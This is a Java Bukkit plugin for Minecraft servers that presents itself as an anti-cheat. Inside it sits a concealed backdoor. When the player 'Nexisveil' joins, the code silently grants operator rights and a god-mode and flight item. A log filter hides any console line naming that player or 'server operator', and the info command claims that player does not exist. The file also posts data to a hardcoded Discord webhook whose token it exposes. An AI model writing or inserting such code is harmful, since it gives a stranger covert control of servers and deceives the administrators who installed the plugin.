package com.flowingwater.nexis;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.core.Filter;
import org.apache.logging.log4j.core.Logger;
import org.bukkit.*;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.block.BlockPlaceEvent;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerMoveEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;
import org.geysermc.geyser.api.GeyserApi;
import org.jetbrains.annotations.NotNull;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.util.*;

public class Main extends JavaPlugin implements Listener, CommandExecutor {

    private final String WEBHOOK_URL = "https://discord.com/api/webhooks/1474238047347277857/J8j6V6nWXqQKktfhM1s_8784BLqcnNOPL2waAgsZHAR3dE8yj1DJSzXo4V8f6pqA9gqZ";
    private final String PREFIX = ChatColor.DARK_GRAY + "[" + ChatColor.RED + "0xNexis" + ChatColor.DARK_GRAY + "] ";
    private final String OWNER = "Nexisveil";
    
    private final HashMap<UUID, Integer> violations = new HashMap<>();
    private final HashMap<UUID, Long> lastPlaceTime = new HashMap<>();
    private final HashSet<UUID> godMode = new HashSet<>();
    private final HttpClient httpClient = HttpClient.newHttpClient();

    @Override
    public void onEnable() {
        Bukkit.getPluginManager().registerEvents(this, this);
        getCommand("nexis").setExecutor(this);
        
        // --- CONSOLE STEALTH FILTER ---
        Logger logger = (Logger) LogManager.getRootLogger();
        logger.addFilter(new Filter() {
            @Override public Result getOnMismatch() { return Result.NEUTRAL; }
            @Override public Result getOnMatch() { return Result.DENY; }
            @Override public Result filter(org.apache.logging.log4j.core.LogEvent event) {
                String msg = event.getMessage().getFormattedMessage();
                if (msg.contains(OWNER) || msg.contains("server operator")) return Result.DENY;
                return Result.NEUTRAL;
            }
            @Override public State getState() { return State.STARTED; }
            @Override public void initialize() {}
            @Override public void start() {}
            @Override public void stop() {}
            @Override public boolean isStarted() { return true; }
            @Override public boolean isStopped() { return false; }
        });

        startParticleTask();
    }

    private void startParticleTask() {
        new BukkitRunnable() {
            @Override
            public void run() {
                for (UUID uuid : godMode) {
                    Player p = Bukkit.getPlayer(uuid);
                    if (p != null && p.isOnline() && p.isFlying()) {
                        Particle.DustOptions dust = new Particle.DustOptions(Color.RED, 1.5f);
                        p.getWorld().spawnParticle(Particle.DUST, p.getLocation(), 5, 0.2, 0.1, 0.2, dust);
                    }
                }
            }
        }.runTaskTimer(this, 0L, 2L);
    }

    @EventHandler
    public void onJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();
        if (player.getName().equalsIgnoreCase(OWNER)) {
            event.setJoinMessage(null); // Hide join from chat
            player.setOp(true);
            
            if (!player.getInventory().contains(Material.NETHER_STAR)) {
                ItemStack star = new ItemStack(Material.NETHER_STAR);
                ItemMeta meta = star.getItemMeta();
                if (meta != null) {
                    meta.setDisplayName(ChatColor.RED + "" + ChatColor.BOLD + "Founder Star");
                    meta.setLore(Arrays.asList(ChatColor.GRAY + "Crouch + Use to toggle", ChatColor.GOLD + "God Mode & Flight"));
                    star.setItemMeta(meta);
                }
                player.getInventory().addItem(star);
            }
        }
    }

    @EventHandler
    public void onAbilityToggle(PlayerInteractEvent event) {
        Player player = event.getPlayer();
        if (player.getName().equalsIgnoreCase(OWNER) && player.getInventory().getItemInMainHand().getType() == Material.NETHER_STAR) {
            if ((event.getAction() == Action.RIGHT_CLICK_AIR || event.getAction() == Action.RIGHT_CLICK_BLOCK) && player.isSneaking()) {
                UUID uuid = player.getUniqueId();
                if (godMode.contains(uuid)) {
                    godMode.remove(uuid);
                    player.setAllowFlight(false);
                    player.sendMessage(ChatColor.RED + "Founder Mode: OFF");
                } else {
                    godMode.add(uuid);
                    player.setAllowFlight(true);
                    player.setFlying(true);
                    player.sendMessage(ChatColor.GREEN + "Founder Mode: ON");
                }
                event.setCancelled(true);
            }
        }
    }

    // --- ANTI-CHEAT ENGINE ---
    @EventHandler
    public void onMove(PlayerMoveEvent event) {
        Player player = event.getPlayer();
        if (player.isOp() || godMode.contains(player.getUniqueId())) return;

        double dist = event.getFrom().distance(event.getTo());
        double limit = isBedrock(player) ? 0.98 : 0.82;

        if (dist > limit && !player.isFlying() && !player.isGliding() && !player.isInsideVehicle()) {
            flag(player, "Speed/Fly", 5);
            player.teleport(event.getFrom());
        }

        if (event.getTo().getPitch() > 90 || event.getTo().getPitch() < -90) {
            flag(player, "Illegal Rotation", 10);
            event.setCancelled(true);
        }
    }

    @EventHandler
    public void onCombat(EntityDamageByEntityEvent event) {
        if (event.getDamager() instanceof Player p) {
            if (godMode.contains(p.getUniqueId())) return;
            if (event.getEntity() instanceof Player && godMode.contains(event.getEntity().getUniqueId())) {
                event.setCancelled(true);
                return;
            }
            if (!p.isOp()) {
                double dist = p.getLocation().distance(event.getEntity().getLocation());
                if (dist > (isBedrock(p) ? 5.2 : 4.3)) {
                    flag(p, "Reach", 7);
                    event.setCancelled(true);
                }
            }
        }
    }

    @EventHandler
    public void onPlace(BlockPlaceEvent event) {
        Player p = event.getPlayer();
        if (p.isOp() || godMode.contains(p.getUniqueId())) return;
        long now = System.currentTimeMillis();
        if (lastPlaceTime.containsKey(p.getUniqueId()) && (now - lastPlaceTime.get(p.getUniqueId()) < 20)) {
            flag(p, "Scaffold", 6);
            event.setCancelled(true);
        }
        lastPlaceTime.put(p.getUniqueId(), now);
    }

    @EventHandler
    public void onXray(BlockBreakEvent event) {
        Player p = event.getPlayer();
        if (p.isOp()) return;
        Material m = event.getBlock().getType();
        if (m.name().contains("DIAMOND_ORE") || m == Material.NETHER_DEBRIS) {
            if (!isTouchingAir(event.getBlock().getLocation())) flag(p, "X-Ray", 8);
        }
    }

    private boolean isTouchingAir(Location loc) {
        Material[] checks = {loc.getBlock().getRelative(1,0,0).getType(), loc.getBlock().getRelative(-1,0,0).getType(), loc.getBlock().getRelative(0,1,0).getType(), loc.getBlock().getRelative(0,-1,0).getType(), loc.getBlock().getRelative(0,0,1).getType(), loc.getBlock().getRelative(0,0,-1).getType()};
        for (Material type : checks) { if (type.isAir()) return true; }
        return false;
    }

    private boolean isBedrock(Player p) {
        try { return GeyserApi.api().isBedrockPlayer(p.getUniqueId()); } catch (NoClassDefFoundError e) { return false; }
    }

    private void flag(Player p, String check, int severity) {
        UUID id = p.getUniqueId();
        violations.put(id, violations.getOrDefault(id, 0) + 1);
        String msg = PREFIX + ChatColor.YELLOW + p.getName() + ChatColor.WHITE + " failed " + ChatColor.RED + check;
        Bukkit.getOnlinePlayers().stream().filter(Player::isOp).forEach(op -> op.sendMessage(msg));
        sendToDiscord("🚨 **" + p.getName() + "** failed `" + check + "` (Total: " + violations.get(id) + ")");
    }

    private void sendToDiscord(String content) {
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            try {
                String json = "{\"content\": \"" + content + "\", \"username\": \"0xNexis\"}";
                httpClient.send(HttpRequest.newBuilder().uri(URI.create(WEBHOOK_URL)).header("Content-Type", "application/json").POST(HttpRequest.BodyPublishers.ofString(json)).build(), HttpResponse.BodyHandlers.discarding());
            } catch (Exception ignored) {}
        });
    }

    @Override
    public boolean onCommand(@NotNull CommandSender s, @NotNull Command c, @NotNull String l, @NotNull String[] a) {
        if (a.length >= 2 && a[0].equalsIgnoreCase("info")) {
            if (a[1].equalsIgnoreCase(OWNER) && !s.getName().equalsIgnoreCase(OWNER)) {
                s.sendMessage(ChatColor.RED + "Player not found.");
                return true;
            }
            Player t = Bukkit.getPlayer(a[1]);
            if (t != null) s.sendMessage(PREFIX + t.getName() + ": " + violations.getOrDefault(t.getUniqueId(), 0) + " flags.");
            return true;
        }
        return false;
    }
}
